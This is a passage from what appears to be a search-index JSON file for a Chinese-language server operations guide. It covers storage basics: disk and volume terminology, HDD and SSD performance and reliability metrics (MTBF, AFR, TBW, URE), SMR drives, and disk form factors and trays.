<p>\u200b\u672c\u200b\u90e8\u5206\u200b\u4f1a\u200b\u5bf9\u200b\u8fd0\u7ef4\u200b\u9700\u8981\u200b\u4e86\u89e3\u200b\u7684\u200b\u57fa\u7840\u77e5\u8bc6\u200b\u8fdb\u884c\u200b\u4ecb\u7ecd\u200b\u3002</p>"},{"location":"ops/storage/intro/#glossary","title":"\u672f\u8bed","text":"<ul> <li>\u200b\u6240\u6709\u200b\u7684\u200b\u6570\u636e\u200b\u6700\u7ec8\u200b\u90fd\u200b\u5b58\u5728\u200b\u4e00\u5757\u200b\u6216\u200b\u591a\u5757\u200b\u7269\u7406\u200b\u78c1\u76d8\u200b\u4e0a\u200b\u3002\u200b\u5728\u200b\u6570\u5341\u5e74\u200b\u524d\u200b\uff0c\u200b\u8f6f\u76d8\u200b\u548c\u200b\u5149\u76d8\u200b\u7b49\u200b\u4e5f\u200b\u662f\u200b\u5e38\u89c1\u200b\u7684\u200b\u5b58\u50a8\u4ecb\u8d28\u200b\uff0c\u200b\u4f46\u662f\u200b\u73b0\u5728\u200b\u5df2\u7ecf\u200b\u5f88\u5c11\u200b\u89c1\u200b\u4e86\u200b\u3002     \u200b\u78c1\u76d8\u200b\u5411\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u5757\u200b\u8bbe\u5907\u200b\u7684\u200b\u62bd\u8c61\u200b\uff0c\u200b\u5757\u200b\u8bbe\u5907\u200b\u662f\u200b\u4e00\u79cd\u200b\u5177\u6709\u200b\u56fa\u5b9a\u200b\u5927\u5c0f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4ee5\u200b\u201c\u200b\u6247\u533a\u200b\u201d\u200b\u4e3a\u200b\u5355\u4f4d\u200b\u8fdb\u884c\u200b\u968f\u673a\u200b\u8bfb\u5199\u200b\u7684\u200b\u8bbe\u5907\u200b\u3002</li> <li>\u200b\u73b0\u4ee3\u200b\u7684\u200b\u78c1\u76d8\u200b\u652f\u6301\u200b\u5206\u533a\u200b\uff0c\u200b\u901a\u8fc7\u200b\u5728\u200b\u78c1\u76d8\u200b\u4e0a\u200b\u5212\u5206\u200b\u51fa\u200b\u4e92\u4e0d\u200b\u91cd\u53e0\u200b\u7684\u200b\u533a\u57df\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5c06\u200b\u78c1\u76d8\u200b\u7684\u200b\u5bb9\u91cf\u200b\u5212\u5206\u200b\u4e3a\u200b\u591a\u4e2a\u200b\u5c0f\u200b\u5757\u200b\uff0c\u200b\u7528\u4e8e\u200b\u4e0d\u540c\u200b\u7684\u200b\u7528\u9014\u200b\u3002</li> <li>\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u662f\u200b\u4e00\u79cd\u200b\u7528\u4e8e\u200b\u78c1\u76d8\u200b\u4e0a\u200b\u7684\u200b\u6570\u636e\u7ed3\u6784\u200b\uff0c\u200b\u5b83\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u6587\u4ef6\u200b\u548c\u200b\u76ee\u5f55\u200b\u7684\u200b\u6982\u5ff5\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u5bf9\u200b\u6587\u4ef6\u200b\u7684\u200b\u8bfb\u5199\u200b\u3001\u200b\u5220\u9664\u200b\u7b49\u200b\u64cd\u4f5c\u200b\u3002     \u200b\u4e00\u4e2a\u200b\u5206\u533a\u200b\u4e0a\u200b\u53ea\u80fd\u200b\u6709\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0c\u200b\u4f46\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u53ef\u4ee5\u200b\u8de8\u8d8a\u200b\u591a\u4e2a\u200b\u5206\u533a\u200b\u3002</li> <li> <p>\u200b\u5377\u200b\u6cdb\u6307\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u53ca\u5176\u200b\u5e95\u5c42\u200b\u7684\u200b\u5b58\u50a8\u200b\u533a\u57df\u200b\uff0c\u200b\u5b83\u200b\u53ef\u4ee5\u200b\u662f\u200b\u4e00\u4e2a\u200b\u5206\u533a\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u662f\u200b\u591a\u4e2a\u200b\u5206\u533a\u200b\u7684\u200b\u7ec4\u5408\u200b\u3002     \u200b\u4f8b\u5982\u200b\uff0cLVM \u200b\u7b49\u200b\u903b\u8f91\u200b\u5377\u200b\u7ba1\u7406\u200b\u65b9\u6848\u200b\u5c06\u200b\u78c1\u76d8\u5206\u533a\u200b\u518d\u6b21\u200b\u7ec4\u5408\u200b\u8d77\u6765\u200b\uff0c\u200b\u6210\u4e3a\u200b\u4e00\u4e2a\u200b\u989d\u5916\u200b\u7684\u200b\u62bd\u8c61\u5c42\u6b21\u200b\u3002     \u200b\u4e3a\u4e86\u200b\u4e0e\u200b\u903b\u8f91\u200b\u5377\u200b\u533a\u5206\u200b\uff0c\u200b\u6709\u65f6\u5019\u200b\u4e5f\u200b\u4f1a\u200b\u5c06\u200b\u76f4\u63a5\u200b\u5b58\u5728\u200b\u4e8e\u200b\u4e00\u4e2a\u200b\u78c1\u76d8\u5206\u533a\u200b\u4e0a\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u79f0\u4e3a\u200b\u7269\u7406\u200b\u5377\u200b\u3002     \u200b\u8fd9\u200b\u4e24\u79cd\u200b\u6982\u5ff5\u200b\u5728\u200b\u4f7f\u7528\u200b\u4e0a\u200b\u6ca1\u6709\u200b\u533a\u522b\u200b\uff0c\u200b\u4ec5\u200b\u5728\u200b\u63a2\u8ba8\u200b\u8ba1\u7b97\u673a\u200b\u5b58\u50a8\u200b\u65b9\u6848\u200b\u65f6\u200b\u65b9\u4fbf\u200b\u6307\u4ee3\u200b\u3002</p> <p>\u200b\u7279\u522b\u200b\u5730\u200b\uff0c\u200b\u5bf9\u4e8e\u200b\u4e00\u4e9b\u200b\u4e0d\u200b\u652f\u6301\u200b\u5206\u533a\u200b\u7684\u200b\u53e4\u8463\u200b\u8bbe\u5907\u200b\uff08\u200b\u8f6f\u76d8\u200b\uff09\uff0c\u200b\u5377\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u6307\u200b\u6574\u4e2a\u200b\u8bbe\u5907\u200b\u548c\u200b\u5176\u4e2d\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u3002</p> <p>Windows \u200b\u4f1a\u200b\u5c06\u200b\u6240\u6709\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u90fd\u200b\u79f0\u4f5c\u200b\u201c\u200b\u5377\u200b\u201d\u3002</p> </li> </ul>"},{"location":"ops/storage/intro/#disks","title":"\u78c1\u76d8","text":""},{"location":"ops/storage/intro/#disk-type","title":"\u78c1\u76d8\u200b\u7c7b\u578b\u200b\u7b80\u4ecb","text":"<p>\u200b\u5728\u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b\u4e3a\u200b\u673a\u68b0\u200b\u786c\u76d8\u200b\uff08HDD\uff09\u200b\u548c\u200b\u56fa\u6001\u200b\u786c\u76d8\u200b\uff08SSD\uff09\u3002\u200b\u673a\u68b0\u200b\u786c\u76d8\u200b\u4f7f\u7528\u200b\u78c1\u76d8\u200b\u7247\u200b\u548c\u200b\u673a\u68b0\u200b\u81c2\u200b\u8fdb\u884c\u200b\u6570\u636e\u200b\u8bfb\u5199\u200b\uff0c\u200b\u56fa\u6001\u200b\u786c\u76d8\u200b\u4f7f\u7528\u200b\u95ea\u5b58\u200b\u82af\u7247\u200b\u8fdb\u884c\u200b\u6570\u636e\u200b\u8bfb\u5199\u200b\u3002 \u200b\u9664\u6b64\u4ee5\u5916\u200b\uff0c\u200b\u8fd8\u200b\u53ef\u80fd\u200b\u6709\u200b\u4e00\u4e9b\u200b\u7279\u6b8a\u200b\u7684\u200b\u5b58\u50a8\u8bbe\u5907\u200b\uff0c\u200b\u4f8b\u5982\u200b\u78c1\u5e26\u200b\u3001Intel Optane \u200b\u7b49\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u4e0d\u200b\u505a\u200b\u8be6\u7ec6\u200b\u4ecb\u7ecd\u200b\u3002</p> <p>\u200b\u4e00\u822c\u6765\u8bb2\u200b\uff0c\u200b\u5355\u5757\u200b\u673a\u68b0\u200b\u786c\u76d8\u200b\u7684\u200b\u6027\u80fd\u200b\u53d6\u51b3\u4e8e\u200b RPM\uff08\u200b\u8f6c\u901f\u200b\uff09\u3002\u200b\u5728\u200b\u4f30\u7b97\u200b\u65f6\u200b\u53ef\u4ee5\u200b\u8ba4\u4e3a\u200b\u987a\u5e8f\u200b\u8bfb\u5199\u200b\u5e26\u5bbd\u200b\u5728\u200b 100 MB/s \u200b\u5de6\u53f3\u200b\uff0c4K \u200b\u968f\u673a\u200b\u8bfb\u5199\u200b\u5e26\u5bbd\u200b\u5728\u200b 1 MB/s \u200b\u5de6\u53f3\u200b\uff0cIOPS<sup>1</sup> \u200b\u5728\u200b 100 \u200b\u5de6\u53f3\u200b\u3002 \u200b\u800c\u200b\u5355\u5757\u200b\u56fa\u6001\u200b\u786c\u76d8\u200b\u7684\u200b\u987a\u5e8f\u200b\u8bfb\u5199\u200b\u5e26\u5bbd\u200b\u5728\u200b 500 MB/s (SATA) \u200b\u6216\u200b 1500 MB/s (NVMe) \u200b\u4ee5\u4e0a\u200b\uff0c4K \u200b\u968f\u673a\u200b\u8bfb\u5199\u200b\u5e26\u5bbd\u200b\u5728\u200b 50 MB/s \u200b\u5de6\u53f3\u200b\uff0cIOPS \u200b\u5728\u200b 10000 \u200b\u5de6\u53f3\u200b\u3002 \u200b\u5bf9\u4e8e\u200b\u4f01\u4e1a\u7ea7\u200b\u786c\u76d8\u200b\uff0c\u200b\u8fd9\u4e9b\u200b\u6027\u80fd\u6307\u6807\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u66f4\u200b\u9ad8\u200b\u3002</p> <p>\u200b\u786c\u76d8\u200b\u7684\u200b\u4f7f\u7528\u5bff\u547d\u200b\u7684\u200b\u4e00\u9879\u200b\u91cd\u8981\u200b\u53c2\u6570\u200b\u662f\u200b MTBF\uff08Mean Time Between Failures\uff0c\u200b\u5e73\u5747\u200b\u6545\u969c\u200b\u95f4\u9694\u65f6\u95f4\u200b\uff09\u3002\u200b\u7531\u4e8e\u200b\u673a\u68b0\u200b\u786c\u76d8\u200b\u5305\u542b\u200b\u8fd0\u52a8\u200b\u7684\u200b\u90e8\u4ef6\u200b\uff0c\u200b\u673a\u68b0\u200b\u786c\u76d8\u200b\u7684\u200b MTBF \u200b\u4e00\u822c\u200b\u4f1a\u200b\u6bd4\u200b\u56fa\u6001\u200b\u786c\u76d8\u200b\u4f4e\u200b\uff0c\u200b\u5927\u81f4\u200b\u5728\u200b 10 \u200b\u4e07\u200b\u5c0f\u65f6\u200b\u5230\u200b 100 \u200b\u4e07\u200b\u5c0f\u65f6\u200b\u3002\u200b\u5c3d\u7ba1\u200b\u770b\u8d77\u6765\u200b\u5f88\u957f\u200b\uff0c\u200b\u4f46\u662f\u200b\u7531\u4e8e\u200b\u5b9e\u9645\u200b\u4f7f\u7528\u200b\u4e2d\u200b\u7684\u200b\u632f\u52a8\u200b\u3001\u200b\u6e29\u5ea6\u200b\u3001\u200b\u8bfb\u5199\u200b\u6b21\u6570\u200b\u7b49\u200b\u56e0\u7d20\u200b\uff0c\u200b\u786c\u76d8\u200b\u7684\u200b\u5b9e\u9645\u200b\u5bff\u547d\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u8fdc\u8fdc\u200b\u4f4e\u4e8e\u200b MTBF\u3002\u200b\u6709\u65f6\u200b\u4e5f\u200b\u80fd\u200b\u770b\u5230\u200b AFR\uff08Annualized Failure Rate\uff09\u200b\u8fd9\u4e2a\u200b\u6307\u6807\u200b\uff0c\u200b\u6307\u4ee3\u200b\u8fd0\u884c\u200b\u4e00\u5e74\u200b\u540e\u200b\u7684\u200b\u635f\u574f\u7387\u200b\u3002\u200b\u5047\u8bbe\u200b\u786c\u76d8\u200b\u5168\u5e74\u200b\u901a\u7535\u200b\uff0c\u200b\u90a3\u4e48\u200b AFR \u200b\u53ef\u4ee5\u200b\u4f30\u8ba1\u200b\u4e3a\u200b 1-e^(-8766/MTBF)\uff08MTBF \u200b\u5355\u4f4d\u200b\u4e3a\u200b\u5c0f\u65f6\u200b\uff09\u3002</p> <p>\u200b\u800c\u200b\u5bf9\u4e8e\u200b SSD \u200b\u6765\u8bf4\u200b\uff0c\u200b\u4e00\u9879\u200b\u66f4\u52a0\u200b\u91cd\u8981\u200b\u7684\u200b\u53c2\u6570\u200b\u662f\u200b TBW\uff08Total Bytes Written\uff0c\u200b\u603b\u200b\u5199\u5165\u200b\u5b57\u8282\u6570\u200b\uff09\uff0c\u200b\u5b83\u200b\u8868\u793a\u200b\u4e86\u200b\u95ea\u5b58\u200b\u82af\u7247\u200b\u53ef\u4ee5\u200b\u627f\u53d7\u200b\u7684\u200b\u603b\u200b\u5199\u5165\u200b\u91cf\u200b\uff0c\u200b\u4e00\u822c\u200b\u5728\u200b\u51e0\u5341\u200b\u5230\u200b\u6570\u5343\u200b TB\uff1b\u200b\u8bfb\u53d6\u200b\u64cd\u4f5c\u200b\u5bf9\u200b SSD \u200b\u7684\u200b\u635f\u8017\u200b\u53ef\u4ee5\u200b\u5ffd\u7565\u4e0d\u8ba1\u200b\u3002</p> <p>\u200b\u53e6\u200b\u4e00\u9879\u200b\u4e0e\u200b\u53ef\u9760\u6027\u200b\u6709\u5173\u200b\u7684\u200b\u91cd\u8981\u200b\u53c2\u6570\u200b\u662f\u200b Unrecoverable Read Error Rate\uff08\u200b\u4e0d\u53ef\u200b\u6062\u590d\u200b\u8bfb\u200b\u9519\u8bef\u7387\u200b\uff0cURE\uff09\uff0c\u200b\u5b83\u200b\u8868\u793a\u200b\u4e86\u200b\u786c\u76d8\u200b\u5728\u200b\u8bfb\u53d6\u6570\u636e\u200b\u65f6\u200b\u51fa\u73b0\u200b\u9519\u8bef\u200b\u7684\u200b\u6982\u7387\u200b\u3002\u200b\u5bf9\u4e8e\u200b\u673a\u68b0\u200b\u786c\u76d8\u200b\u6765\u8bb2\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u503c\u200b\u4e00\u822c\u200b\u4e3a\u200b 10^-14 \u200b\u5230\u200b 10^-15\uff08\u200b\u6709\u65f6\u200b\u4e5f\u200b\u6807\u6ce8\u200b\u4e3a\u200b 1 in 10^14\u30011 in 10^15 \u200b\u7b49\u200b\uff09\uff0c\u200b\u5373\u200b\u5e73\u5747\u200b\u6bcf\u200b\u8bfb\u53d6\u200b 10^14\uff0812.5 TB\uff09\u200b\u5230\u200b 10^15\uff08125 TB\uff09\u200b\u4f4d\u200b\u7684\u200b\u6570\u636e\u200b\u4e2d\u4f1a\u200b\u6709\u200b\u4e00\u4f4d\u200b\u51fa\u73b0\u200b\u9519\u8bef\u200b\uff08\u200b\u8fd9\u200b\u4e0d\u200b\u4ee3\u8868\u200b\u8bfb\u53d6\u200b\u4e86\u200b 12.5/125 TB \u200b\u4e4b\u540e\u200b\u5c31\u200b\u4e00\u5b9a\u200b\u4f1a\u200b\u9047\u5230\u200b\u4e00\u6b21\u200b\u9519\u8bef\u200b\uff09\u3002\u200b\u800c\u200b\u5bf9\u4e8e\u200b\u56fa\u6001\u200b\u786c\u76d8\u200b\uff0c\u200b\u4e00\u822c\u200b\u4e3a\u200b 10^-16 \u200b\u5230\u200b 10^-17\u3002\u200b\u5982\u679c\u200b\u5728\u200b\u91cd\u5efa\u200b RAID \u200b\u65f6\u200b\u9047\u5230\u200b URE \u200b\u5e76\u4e14\u200b\u6ca1\u6709\u200b\u989d\u5916\u200b\u7684\u200b parity\uff0c\u200b\u89c6\u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b\u800c\u5b9a\u200b\uff0c\u200b\u91cd\u5efa\u200b\u64cd\u4f5c\u200b\u4f1a\u200b\u5931\u8d25\u200b\u6216\u200b\u4e22\u5931\u200b\u90e8\u5206\u200b\u6570\u636e\u200b\u3002\u200b\u5728\u200b\u5b9e\u73b0\u200b\u5141\u8bb8\u200b\u5ffd\u7565\u200b URE \u200b\u7ee7\u7eed\u200b\u91cd\u5efa\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u53d1\u751f\u200b URE \u200b\u5904\u200b\u5bf9\u5e94\u200b\u7684\u200b\u6570\u636e\u200b\u65e0\u6cd5\u200b\u6062\u590d\u200b\uff0c\u200b\u5982\u679c\u200b\u662f\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u5173\u952e\u200b\u6570\u636e\u7ed3\u6784\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5c31\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u635f\u574f\u200b\uff0c\u200b\u5927\u91cf\u200b\u6570\u636e\u200b\u4e22\u5931\u200b\u3002</p> <p>\u200b\u5bf9\u200b\u5177\u4f53\u200b\u7684\u200b\u786c\u76d8\u200b\u578b\u53f7\u200b\uff0c\u200b\u5efa\u8bae\u200b\u9605\u8bfb\u200b\u5382\u5546\u200b\u7684\u200b\u6587\u6863\u200b\uff08\u200b\u4f8b\u5982\u200b datasheet \u200b\u7b49\u200b\uff09\uff0c\u200b\u4ee5\u200b\u83b7\u53d6\u200b\u51c6\u786e\u200b\u7684\u200b\u4fe1\u606f\u200b\u3002\u200b\u6b64\u5916\u200b\uff0c\u200b\u4e91\u200b\u670d\u52a1\u5546\u200b Backblaze \u200b\u4f1a\u200b\u5b9a\u671f\u200b\u53d1\u5e03\u200b\u4ed6\u4eec\u200b\u7684\u200b\u786c\u76d8\u200b\u4f7f\u7528\u200b\u62a5\u544a\u200b\uff0c\u200b\u5305\u542b\u200b\u786c\u76d8\u200b\u5728\u200b\u771f\u5b9e\u200b\u6570\u636e\u4e2d\u5fc3\u200b\u5de5\u51b5\u200b\u4e0b\u200b\u7684\u200b AFR \u200b\u7b49\u200b\u4fe1\u606f\u200b\uff0c\u200b\u53ef\u200b\u524d\u5f80\u200b https://www.backblaze.com/cloud-storage/resources/hard-drive-test-data \u200b\u4e0b\u8f7d\u200b\uff0c\u200b\u4ee5\u4f5c\u200b\u53c2\u8003\u200b\u3002</p> <p>Zoned storage \u200b\u4e0e\u200b\u53e0\u200b\u74e6\u200b\uff08SMR\uff09\u200b\u76d8\u200b</p> <p>Zoned storage \u200b\u662f\u200b\u4e00\u79cd\u200b\u65b0\u578b\u200b\u7684\u200b\u786c\u76d8\u200b\u5b58\u50a8\u6280\u672f\u200b\uff0c\u200b\u5b83\u200b\u5c06\u200b\u786c\u76d8\u200b\u5206\u4e3a\u200b\u591a\u4e2a\u200b\u533a\u57df\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u533a\u57df\u200b\u7684\u200b\u5199\u5165\u200b\u65b9\u5f0f\u200b\u4e0d\u540c\u200b\uff0c \u200b\u901a\u8fc7\u200b\u66b4\u9732\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u4fe1\u606f\u200b\u7ed9\u200b OS \u200b\u4f7f\u5f97\u200b\u9488\u5bf9\u6027\u200b\u7684\u200b\u4f18\u5316\u200b\u5f97\u4ee5\u200b\u8fdb\u884c\u200b\uff0c\u200b\u4ee5\u200b\u63d0\u5347\u200b\u786c\u76d8\u200b\u7684\u200b\u5bb9\u91cf\u200b\u548c\u200b\u6027\u80fd\u200b\u3002 \u200b\u6211\u4eec\u200b\u5e38\u8bf4\u200b\u7684\u200b\u300c\u200b\u53e0\u74e6\u76d8\u200b\u300d\u200b\u5c31\u662f\u200b\u4e00\u79cd\u200b zoned storage\u3002\u200b\u53e0\u74e6\u76d8\u200b\u901a\u8fc7\u200b\u91cd\u53e0\u200b\u78c1\u9053\u200b\u7684\u200b\u65b9\u5f0f\u200b\uff08\u200b\u7c7b\u4f3c\u200b\u4e8e\u200b\u5c4b\u9876\u200b\u4e0a\u200b\u74e6\u7247\u200b\u6392\u5217\u200b\u4e00\u822c\u200b\uff09\u200b\u6765\u200b\u589e\u52a0\u200b\u5b58\u50a8\u5bc6\u5ea6\u200b\u3002 \u200b\u5176\u200b\u5199\u5165\u200b\u548c\u200b\u56fa\u6001\u200b\u786c\u76d8\u200b\u7684\u200b\u95ea\u5b58\u200b\u6709\u200b\u4e00\u4e9b\u200b\u76f8\u4f3c\u200b\uff1a\u200b\u9700\u8981\u200b\u5148\u200b\u8bfb\u53d6\u200b\u4e34\u8fd1\u200b\u78c1\u9053\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u7136\u540e\u200b\u64e6\u9664\u200b\u6574\u4e2a\u200b\u533a\u5757\u200b\uff0c\u200b\u518d\u200b\u91cd\u5199\u200b\uff0c\u200b\u4f1a\u200b\u5f88\u5927\u200b\u7a0b\u5ea6\u200b\u5f71\u54cd\u200b\u5199\u5165\u200b\u6027\u80fd\u200b\u3002 \u200b\u56e0\u6b64\u200b\u53e0\u74e6\u76d8\u200b\u5185\u90e8\u200b\u901a\u5e38\u200b\u5212\u5206\u200b\u4e3a\u200b\u591a\u4e2a\u200b\u5199\u5165\u200b\u533a\u57df\u200b\uff0c\u200b\u4ee5\u200b\u51cf\u5c0f\u200b\u5199\u5165\u200b\u6027\u80fd\u200b\u7684\u200b\u5f71\u54cd\u200b\u3002</p> <p>\u200b\u4f46\u662f\u200b\u4f60\u200b\u5728\u200b\u5e02\u9762\u4e0a\u200b\u53ef\u4ee5\u200b\u4e70\u5230\u200b\u7684\u200b\u53e0\u74e6\u76d8\u200b\u51e0\u4e4e\u200b\u90fd\u200b\u6ca1\u6709\u200b\u66b4\u9732\u200b zoned storage \u200b\u7684\u200b\u63a5\u53e3\u200b\u7ed9\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\uff08\u200b\u8fd9\u4e9b\u200b\u76d8\u200b\u4e5f\u200b\u88ab\u200b\u79f0\u4e3a\u200b Device-Managed SMR\uff09\uff0c \u200b\u56e0\u6b64\u200b\u5728\u200b\u7cfb\u7edf\u200b\u5199\u5165\u200b\u65f6\u200b\u4ecd\u4f1a\u200b\u5c06\u200b\u5176\u200b\u89c6\u4e3a\u200b\u666e\u901a\u200b\u786c\u76d8\u200b\u3002 \u200b\u8fd9\u200b\u5bfc\u81f4\u200b\u4e86\u200b\u53e0\u74e6\u76d8\u200b\u7684\u200b\u6027\u80fd\u200b\u8fdc\u200b\u4e0d\u53ca\u200b\u4f20\u7edf\u200b\u7684\u200b\u975e\u200b\u91cd\u53e0\u200b\u78c1\u9053\u200b\u7684\u200b\u786c\u76d8\u200b\u3002\u200b\u786c\u76d8\u200b\u5382\u5546\u200b\u53ef\u80fd\u200b\u4e0d\u4f1a\u200b\u6807\u6ce8\u200b\u76f8\u5173\u200b\u4fe1\u606f\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5728\u200b\u8d2d\u4e70\u200b\u786c\u76d8\u200b\u65f6\u200b\u9700\u8981\u200b\u7279\u522b\u200b\u6ce8\u610f\u200b\u3002</p>"},{"location":"ops/storage/intro/#disk-size","title":"\u78c1\u76d8\u200b\u89c4\u683c\u200b\u4e0e\u200b\u5c3a\u5bf8","text":"<p>\u200b\u5173\u4e8e\u200b\u78c1\u76d8\u200b\u89c4\u683c\u200b\uff0c\u200b\u5728\u200b\u670d\u52a1\u5668\u200b\u5b89\u88c5\u200b\u65f6\u200b\u6211\u4eec\u200b\u4e3b\u8981\u200b\u5173\u5fc3\u200b\u4ee5\u4e0b\u51e0\u70b9\u200b\uff1a</p> <ul> <li>\u200b\u78c1\u76d8\u200b\u7684\u200b\u5c3a\u5bf8\u200b\uff082.5 \u200b\u82f1\u5bf8\u200b\u30013.5 \u200b\u82f1\u5bf8\u200b\uff09<ul> <li>\u200b\u90e8\u5206\u200b\u624b\u518c\u200b\u4f1a\u200b\u5c06\u200b 2.5 \u200b\u82f1\u5bf8\u200b\u7684\u200b\u78c1\u76d8\u200b\u79f0\u4e3a\u200b SFF\uff08Small Form Factor\uff09\uff0c3.5 \u200b\u82f1\u5bf8\u200b\u7684\u200b\u78c1\u76d8\u200b\u79f0\u4e3a\u200b LFF\uff08Large Form Factor\uff09\u3002</li> </ul> </li> <li>\u200b\u78c1\u76d8\u200b\u7684\u200b\u63a5\u53e3\u200b\u4e0e\u200b\u534f\u8bae\u200b\uff08SAS\u3001SATA\u3001NVMe\u3001M.2\u3001U.2\uff09</li> <li>\u200b\u662f\u5426\u200b\u4e0e\u200b\u670d\u52a1\u5668\u200b\u914d\u7f6e\u200b\u517c\u5bb9\u200b\uff1a<ul> <li>\u200b\u90e8\u5206\u200b\u670d\u52a1\u5668\u200b\u4f1a\u200b\u6709\u200b\u786c\u76d8\u200b\u767d\u540d\u5355\u200b\uff0c\u200b\u53ea\u6709\u200b\u767d\u540d\u5355\u200b\u4e2d\u200b\u7684\u200b\u786c\u76d8\u200b\u624d\u80fd\u200b\u8bc6\u522b\u200b\u3002</li> <li>\u200b\u4f7f\u7528\u200b\u7684\u200b\u786c\u4ef6\u200b RAID \u200b\u65b9\u6848\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5bf9\u200b\u786c\u76d8\u200b\u63a5\u53e3\u200b\u6709\u200b\u8981\u6c42\u200b\uff0c\u200b\u4f8b\u5982\u200b SATA \u200b\u548c\u200b SAS \u200b\u63a5\u53e3\u200b\u7684\u200b\u786c\u76d8\u200b\u4e0d\u80fd\u200b\u6df7\u7528\u200b\u3002</li> </ul> </li> </ul> <p>\u200b\u4ed4\u7ec6\u9605\u8bfb\u200b\u5e76\u200b\u786e\u8ba4\u200b\u5382\u5546\u200b\u6587\u6863\u200b</p> <p>\u200b\u4e00\u4e2a\u200b\u73b0\u5b9e\u200b\u4e2d\u200b\u53d1\u751f\u200b\u8fc7\u200b\u7684\u200b\u4f8b\u5b50\u200b\u662f\u200b\uff1a\u200b\u5c06\u200b\u9519\u8bef\u200b\u7684\u200b\u786c\u76d8\u200b\u6258\u67b6\u200b\u5b89\u88c5\u200b\u81f3\u200b\u670d\u52a1\u5668\u200b\u76d8\u4f4d\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u6258\u67b6\u200b\u5361\u4f4f\u200b\u65e0\u6cd5\u200b\u53d6\u51fa\u200b\uff0c\u200b\u6700\u540e\u200b\u8d39\u200b\u4e86\u200b\u8fd1\u200b\u534a\u4e2a\u200b\u5c0f\u65f6\u200b\uff0c\u200b\u751a\u81f3\u200b\u7528\u200b\u4e0a\u200b\u4e86\u200b\u87ba\u4e1d\u5200\u200b\u4f5c\u4e3a\u200b\u6760\u6746\u200b\uff0c\u200b\u624d\u200b\u5c06\u200b\u5176\u200b\u677e\u52a8\u200b\uff0c\u200b\u53d6\u51fa\u200b\u786c\u76d8\u200b\u3002</p> <p>\u200b\u78c1\u76d8\u200b\u9700\u8981\u200b\u5e26\u4e0a\u200b\u6258\u67b6\u200b\u624d\u80fd\u200b\u5b89\u88c5\u200b\u5230\u200b\u670d\u52a1\u5668\u200b\u4e2d\u200b\u3002\u200b\u6258\u67b6\u200b\u7684\u200b\u4e3b\u8981\u200b\u4f5c\u7528\u200b\u662f\u200b\u56fa\u5b9a\u200b\u4f4f\u200b\u78c1\u76d8\u200b\uff0c\u200b\u5e76\u4e14\u200b\u65b9\u4fbf\u200b\u5b89\u88c5\u200b\u548c\u200b\u53d6\u51fa\u200b\u3002\u200b\u6258\u67b6\u200b\u7684\u200b\u5c3a\u5bf8\u200b\u4e0e\u200b\u78c1\u76d8\u200b\u7684\u200b\u5c3a\u5bf8\u200b\u6709\u5173\u200b\uff0c3.5 \u200b\u82f1\u5bf8\u200b\u78c1\u76d8\u200b\u7684\u200b\u6258\u67b6\u200b\u4e00\u822c\u200b\u9700\u8981\u200b\u5b89\u88c5\u200b\u8f6c\u63a5\u200b\u677f\u200b\u624d\u80fd\u200b\u5b89\u88c5\u200b 2.5 \u200b\u82f1\u5bf8\u200b\u7684\u200b\u78c1\u76d8\u200b\uff0c\u200b\u4f46\u200b\u4e5f\u200b\u6709\u200b\u4e00\u4e9b\u200b\u6258\u67b6\u200b\u9884\u7559\u200b\u4e86\u200b 2.5 \u200b\u82f1\u5bf8\u200b\u78c1\u76d8\u200b\u7684\u200b\u87ba\u4e1d\u200b\u5b54\u4f4d\u200b\u3002\u200b\u540c\u65f6\u200b\uff0c\u200b\u6258\u67b6\u200b\u4e5f\u200b\u4e00\u822c\u200b\u6709\u200b LED \u200b\u706f\u200b\uff0c\u200b\u5728\u200b\u78c1\u76d8\u200b\u6545\u969c\u200b\u65f6\u4f1a\u200b\u4eae\u200b\u9ec4\u706f\u200b\u6216\u200b\u7ea2\u706f\u200b\uff0c\u200b\u4e5f\u200b\u4e00\u822c\u200b\u80fd\u591f\u200b\u4f7f\u7528\u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u7ba1\u7406\u5de5\u5177\u200b\u63a7\u5236\u200b\u706f\u200b\u95ea\u70c1\u200b\u6765\u200b\u5b9a\u4f4d\u200b\u78c1\u76d8\u200b\u3002</p>"},{"location":"ops/storage/intro/#disk-interface","title":"\u78c1\u76d8\u200b\u63a5\u53e3\u200b\u4e0e\u200b\u534f\u8bae","text":"<p>\u200b\u673a\u68b0\u200b\u786c\u76d8\u200b\u4f7f\u7528\u200b SATA\uff08Serial ATA\uff09\u200b\u6216\u200b SAS\uff08Serial Attached 